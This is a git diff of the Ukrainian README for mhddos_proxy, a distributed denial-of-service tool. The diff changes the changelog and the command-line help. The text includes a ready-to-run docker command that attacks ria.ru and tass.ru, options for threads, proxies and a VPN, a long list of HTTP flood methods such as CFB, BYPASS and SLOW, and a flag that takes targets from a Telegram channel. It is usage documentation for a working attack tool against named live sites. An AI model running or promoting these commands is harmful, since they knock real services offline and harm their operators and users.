@@ -38,7 +38,7 @@
 - **04.04.2022** Додано можливість використання власного списку проксі для атаки - [інструкція](#власні-проксі)
 - **03.04.2022** Виправлена помилка Too many open files (дякую, @kobzar-darmogray та @euclid-catoptrics)
 - **02.04.2022** Робочі потоки більше не перезапускаються на кожен цикл, а використовуються повторно. Також виправлена робота Ctrl-C
-- **01.04.2022** Оновленно метод CFB у відповідності з MHDDoS.
+- **01.04.2022** Оновленно метод CFB у відповідності з MHDDoS
 - **31.03.2022** Додано надійні DNS сервери для резолвінгу цілі, замість системних. (1.1.1.1, 8.8.8.8 etc.)
 - **29.03.2022** Додано підтримку локального файлу конфігурації (дуже дякую, @kobzar-darmogray).
 - **28.03.2022** Додано табличний вивід `--table` (дуже дякую, @alexneo2003).
@@ -49,7 +49,7 @@
     - Зменшено використання RAM на великій кількості цілей - тепер на RAM впливає тільки параметр `-t`
     - Додане кешування DNS і корректна обробка проблем з резолвінгом
 - **25.03.2022** Додано режим VPN замість проксі (прапорець `--vpn`)
-- **25.03.2022** MHDDoS включено до складу репозиторію для більшого контролю над розробкою і захистом від неочікуваних
+- **25.03.2022** MHDDoS включено до складу репозиторію для більшого контролю над розробкою і захистом від неочікуваних 
   змін
 </details>
 
@@ -71,7 +71,7 @@
 
 Змінити навантаження - `-t XXXX` - максимальна кількість одночасно відкритих зʼєднань, за замовченням - 1000 (якщо на машині одне CPU) або 7500 (якщо більше одного).  
 
-***Для Linux додавайте `sudo` на початку команди з docker***  
+***Для Linux додавайте `sudo` на початку команди з `docker`***  
 
     docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 3000 https://ria.ru https://tass.ru
 
@@ -111,17 +111,25 @@
       targets                List of targets, separated by space
     
     optional arguments:
-      -h, --help             show this help message and exit
-      -c, --config URL|path  URL or local path to file with attack targets
-      -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
-      --table                Print log as table
-      --debug                Print log as text
-      --vpn                  Use both my IP and proxies for the attack. Optionally, specify a percent of using my IP (default is 10%)
-      --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
-      --proxies URL|path     URL or local path(ex. proxies.txt) to file with proxies to use
-      --http-methods GET     List of HTTP(s) attack methods to use (default is GET + POST|STRESS).
-      --itarmy               Attack targets from https://t.me/itarmyofukraine2022  
-      --copies 1             Number of copies to run (default is 1)
+      -h, --help            show this help message and exit
+      -c, --config URL|path URL or local path to file with attack targets
+      -t, --threads 2000    Total number of threads to run (default is CPU * 1000)
+      --copies 1            Number of copies to run (default is 1)
+      --rpc RPC             How many requests to send on a single proxy connection (default is 2000)
+      --table               Print log as table
+      --debug               Print log as text
+      --vpn [USE_MY_IP]     Use both my IP and proxies for the attack. Optionally, specify a percent of using my IP (default is 10%)
+      --http-methods        {DYN,PPS,BYPASS,OVH,TREX,NULL,GET,DOWNLOADER,CFB,RHEAD,AVB,EVEN,SLOW,STRESS,XMLRPC,RGET,HEAD,APACHE,COOKIE,STOMP,RHEX,POST} [{DYN,PPS,BYPASS,OVH,TREX,NULL,GET,DOWNLOADER,CFB,RHEAD,AVB,EVEN,SLOW,STRESS,XMLRPC,RGET,HEAD,APACHE,COOKIE,STOMP,RHEX,POST} ...]
+                            List of HTTP(s) attack methods to use. Default is GET + POST|STRESS
+      --proxies URL|path    URL or local path(ex. proxies.txt) to file with proxies to use 
+      --itarmy              Attack targets from https://t.me/itarmyofukraine2022  
+      --scheduler-initial-capacity SCHEDULER_INITIAL_CAPACITY
+                            How many tasks per target to initialize on launch
+      --scheduler-fork-scale SCHEDULER_FORK_SCALE
+                            How many tasks to fork on successful connect to the target
+      --scheduler-failure-delay SCHEDULER_FAILURE_DELAY
+                            Time delay before re-launching failed tasks (seconds)
+      --lang {EN,UA}        Interface and report language
 
 ### Власні проксі
 
